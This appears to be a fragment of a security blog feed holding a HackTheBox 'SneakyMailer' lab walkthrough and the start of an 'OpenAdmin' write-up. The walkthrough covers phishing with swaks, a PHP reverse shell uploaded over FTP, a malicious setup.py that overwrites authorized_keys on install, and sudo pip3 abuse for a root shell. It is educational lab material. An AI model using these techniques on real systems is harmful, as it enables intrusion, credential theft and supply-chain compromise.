+<p><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt="1a6090141fa446bd88cf25781913b8d5" style="zoom:67%;" /></p>
+<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
+<p><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt="c3c89ffbc8854cf1abf6ebece09b0197" style="zoom:67%;" /></p>
+<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ cat team | egrep -o <span style="color:#e6db74">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> | tr -d <span style="color:#e6db74">&#34;&lt;&gt;&#34;</span> | tee emails.list
+</code></pre></div><p><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt="612596863de94710b3a4ed80fd375133" style="zoom:67%;" /></p>
+<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
+<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
+<p>It returns the default Nginx page.</p>
+<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
+<p>I tried to send an email, and it got queued.</p>
+<p><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt="4b5e0238399640bd9b40a2810102ce39" style="zoom:67%;" /></p>
+<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
+<h4 id="email-phishing">Email Phishing</h4>
+<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ swaks --server <span style="color:#e6db74">&#39;10.10.10.197&#39;</span> --to <span style="color:#e6db74">`</span>cat emails.list | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">`</span> --from admin@sneakymailer.htb --body <span style="color:#e6db74">&#34;http://10.10.14.42/&#34;</span>
+</code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
+<p><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt="330df9a36349481fb8d7cef7660c535e" style="zoom:67%;" /></p>
+<p>The request body contains this data.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+</span></code></pre></div><p>It can be decoded using an online url decoder.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
+</span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
+<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
+<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
+<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><h4 id="initial-setup">Initial Setup</h4>
+<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
+<p><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt="336c2c9d596e4a86ba1ce454e912b2d9" style="zoom:67%;" /></p>
+<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
+<p><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt="aaa3354fe43a4564b1b13aec5c14a83c" style="zoom:67%;" /></p>
+<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
+<p><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt="3361aa3232224c8890c857f9e913becc" style="zoom:67%;" /></p>
+<p>I lost some screenshots after the step above, but here is the final configuration.</p>
+<p><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt="8ded1188afee41fd852d14e4943fc9b4" style="zoom:67%;" /></p>
+<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
+<h4 id="retrieving-the-emails">Retrieving the emails</h4>
+<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
+<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
+<p><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt="540344afea7f42debd7cdc36f3fadd32" style="zoom:67%;" /></p>
+<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
+<p><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt="f11b8bd4b2934eb892f681d23a369cdd" style="zoom:67%;" /></p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="ftp-access">FTP Access</h4>
+<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
+<p><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt="f761f7b9b264477ebae8d690c347cbef" style="zoom:67%;" /></p>
+<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
+<p><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt="cea046ccdffc4e0f83620407c53726d5" style="zoom: 67%;" /></p>
+<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
+<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">211-FTP server status:
+     Connected to ::ffff:10.10.14.20
+     Logged in as developer
+     TYPE: ASCII
+     No session bandwidth limit
+     Session timeout in seconds is <span style="color:#ae81ff">300</span>
+     Control connection is plain text
+     Data connections will be plain text
+     At session startup, client count was <span style="color:#ae81ff">1</span>
+     vsFTPd 3.0.3 - secure, fast, stable
+ftp&gt; cd /dev
+<span style="color:#ae81ff">250</span> Directory successfully changed.
+ftp&gt; put /shares/reversef.php iamf.php
+local: /shares/reversef.php remote: iamf.php
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Ok to send data.
+<span style="color:#ae81ff">226</span> Transfer complete.
+<span style="color:#ae81ff">72</span> bytes sent in 0.00 secs <span style="color:#f92672">(</span>2.8610 MB/s<span style="color:#f92672">)</span>
+</code></pre></div><p>At first I thought it was on <code>http://sneakycorp.htb/iamf.php</code>, the uploaded shell was available on <code>http://dev.sneakycorp.htb/iamf.php</code>, so I&rsquo;ll have to add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ echo <span style="color:#e6db74">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
+</code></pre></div><p>Now I can trigger my web shell with curl.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ curl -s http://dev.sneakycorp.htb/iamf.php
+</code></pre></div><p>The listener has an interactive shell now.</p>
+<p><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt="43276abaf55b4760822901631d8c21de" style="zoom:67%;" /></p>
+<p>After gaining access to the box, I can re-enumerate and search for files containing sensitive data.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-low">Shell as low</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
+<p><img src="imgs/image-20210429003013735.png" alt="image-20210429003013735" style="zoom: 67%;" /></p>
+<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
+<p><img src="imgs/image-20210429003321320.png" alt="image-20210429003321320" style="zoom:67%;" /></p>
+<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
+<h4 id="cracking-password">Cracking Password</h4>
+<p>The password can be cracked easily with John the Ripper.</p>
+<p><img src="imgs/image-20210429003613068.png" alt="image-20210429003613068" style="zoom:67%;" /></p>
+<p>The password is <code>soufianeelhaoui</code></p>
+<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
+<p>Looking into the web configuration file, <code>pypi.sneakycorp.htb</code> is accessible on <code>localhost:5000</code>.</p>
+<p><img src="imgs/image-20210429005849918.png" alt="image-20210429005849918" style="zoom: 67%;" /></p>
+<p>It is also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
+<p><img src="imgs/image-20210429005829551.png" alt="image-20210429005829551" style="zoom:67%;" /></p>
+<p>Remember about the second email Paul sent to user law?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Hello low
+
+Your current task is to install, test and then erase every python module you 
+find in our PyPI service, let me know if you have any inconvenience.
+</code></pre></div><p>Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
+<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
+<ul>
+<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
+<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
+</ul>
+<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;README.md&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> fh:
+    long_description <span style="color:#f92672">=</span> fh<span style="color:#f92672">.</span>read()
+
+setuptools<span style="color:#f92672">.</span>setup(
+    name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span>, <span style="color:#75715e"># Replace with your own username</span>
+    version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
+    author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
+    author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
+    description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
+    long_description<span style="color:#f92672">=</span>long_description,
+    long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
+    url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
+    project_urls<span style="color:#f92672">=</span>{
+        <span style="color:#e6db74">&#34;Bug Tracker&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject/issues&#34;</span>,
+    },
+    classifiers<span style="color:#f92672">=</span>[
+        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
+        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
+        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
+    ],
+    package_dir<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;&#34;</span>: <span style="color:#e6db74">&#34;src&#34;</span>},
+    packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(where<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;src&#34;</span>),
+    python_requires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&gt;=3.6&#34;</span>,
+)
+</code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools
+<span style="color:#66d9ef">try</span>:
+        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/home/low/.ssh/authorized_keys&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+                f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span>)
+        f<span style="color:#f92672">.</span>close()
+<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+        <span style="color:#66d9ef">pass</span>
+setuptools<span style="color:#f92672">.</span>setup(
+        name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;low&#34;</span>,
+        version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
+        author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
+        author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
+        description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
+        long_description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>,
+        long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
+     url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
+     packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(),
+     classifiers<span style="color:#f92672">=</span>[
+        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
+        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
+        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
+     ],
+)
+</code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
+<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
+<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
+ <span style="color:#a6e22e">local</span>
+ 
+[<span style="color:#a6e22e">local</span>]
+<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#ae81ff">127.0</span>.<span style="color:#ae81ff">0.1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span>
+<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
+<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
+</code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
+<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
+ <span style="color:#a6e22e">remote</span>
+ 
+[<span style="color:#a6e22e">remote</span>]
+<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#a6e22e">pypi</span>.<span style="color:#a6e22e">sneakycorp</span>.<span style="color:#a6e22e">htb</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>
+<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
+<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
+</code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.42» 
+$ python3 -m http.server <span style="color:#ae81ff">80</span>
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:12<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:29<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /setup.py HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</code></pre></div><p>On SneakyMailer:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
+www-data@sneakymailer:/dev/shm$ 
+www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
+</code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">.
+├── .pypirc
+├── iamf.php
+└── setup.py
+</code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ export $HOME<span style="color:#f92672">=</span>/dev/shm
+www-data@sneakymailer:~$
+</code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:~$ python3 setup.py sdist upload -r local
+running sdist
+running egg_info
+writing low.egg-info/PKG-INFO
+writing dependency_links to low.egg-info/dependency_links.txt
+writing top-level names to low.egg-info/top_level.txt
+reading manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
+writing manifest file <span style="color:#e6db74">&#39;low.egg-info/SOURCES.txt&#39;</span>
+warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
+running check
+creating low-0.0.1
+creating low-0.0.1/low.egg-info
+copying files to low-0.0.1…
+copying setup.py -&gt; low-0.0.1
+copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
+copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
+copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
+copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
+Writing low-0.0.1/setup.cfg
+Creating tar archive
+removing <span style="color:#e6db74">&#39;low-0.0.1&#39;</span> <span style="color:#f92672">(</span>and everything under it<span style="color:#f92672">)</span>
+running upload
+Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
+Server response <span style="color:#f92672">(</span>200<span style="color:#f92672">)</span>: OK
+WARNING: Uploading via this command is deprecated, use twine to upload instead <span style="color:#f92672">(</span>https://pypi.org/p/twine/<span style="color:#f92672">)</span>
+</code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
+<h4 id="ssh-access">SSH Access</h4>
+<p>Now I can login with my private key as user <code>low</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
+$ ssh -i id_ecdsa low@10.10.10.197
+</code></pre></div><p><img src="imgs/image-20210429021145269.png" alt="image-20210429021145269" style="zoom:67%;" /></p>
+<p>User flag is done here.</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
+<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
+<p><img src="imgs/image-20210429021533891.png" alt="image-20210429021533891" style="zoom: 67%;" /></p>
+<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">low@sneakymailer:~$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+low@sneakymailer:~$
+low@sneakymailer:~$ echo <span style="color:#e6db74">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; $TF/setup.py
+low@sneakymailer:~$
+low@sneakymailer:~$ sudo pip3 install $TF
+</code></pre></div><p><img src="imgs/image-20210429021914961.png" alt="image-20210429021914961" style="zoom:67%;" /></p>
+<p>Or to get a shell as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">low@sneakymailer:~$ TF=$(mktemp -d)
+low@sneakymailer:~$
+low@sneakymailer:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
+low@sneakymailer:~$
+low@sneakymailer:~$ sudo pip3 install $TF
+sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
+Processing /tmp/tmp.9ShSegy5bm
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - OpenAdmin</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</link>
+      <pubDate>Fri, 02 Apr 2021 04:25:51 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</guid>
+      <description>Exploiting OpenNetAdmin vulnerability and sudo nano</description>
+      <content:encoded><![CDATA[<p>OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally. The internal web has a logic flaw that allows me to obtain the SSH key of the second user. The second user is allowed to run a <code>nano</code> editor with sudo privileges, and this can be abused to gain root access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>OpenNetAdmin 18.1.1 exploitation</li>
+<li>Exploiting sudo privileges on nano</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Dirb - Preinstalled in Kali Linux</li>
+<li>John The Ripper - <a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
+$ nmap -sV -sC -oA OpenAdmin <span style="color:#e6db74">&#39;10.10.10.171&#39;</span> -v
+</code></pre></div><ul>
+<li><code>-sC</code>, to scan with default script</li>
+<li><code>-sV</code>, to scan service version</li>
+<li><code>-oA</code>, to save the output to all formats</li>
+<li><code>-v</code>, verbose mode</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>From the scan results, <code>nmap</code> found two open ports:</p>
+<ul>
+<li>An SSH service running on port 22</li>
+<li>An HTTP service running on port 80</li>
+</ul>
+<p>Also, from the scan above, the machine is likely running Ubuntu.</p>
+<p>As SSH usually requires valid credentials and there&rsquo;s is no straight exploit yet, hence further enumeration is needed.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP  80 - Website</h3>
+<p>Visiting the standard http port only displays the Apache default page.</p>
+<p><div class="img-container"><img src="imgs/4fb96d89a99c4244bb54291abd974267.png" alt="1ad0727e5956f0800cbe4ec0c02df451.png"  /></div>
+</p>
+<h4 id="directory-brute-force---dirb">Directory Brute Force - dirb</h4>
+<p>Running  <code>dirb</code>  against the web successfully discovered a few hidden paths.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
+$ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r
+...&lt;SNIP&gt;...
+---- Scanning URL: http://10.10.10.171/ ----
+<span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.10.171/artwork/
++ http://10.10.10.171/index.html<span style="color:#f92672">(</span>CODE:200|SIZE:10918<span style="color:#f92672">)</span> 
+<span style="color:#f92672">==</span>&gt; DIRECTORY: http:/10.10.10.171/music/
++ http://10.10.10.171/server-status <span style="color:#f92672">(</span>CODE:200|SIZE:278<span style="color:#f92672">)</span>
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="artwork">/artwork/</h4>
+<p>Nothing here.</p>
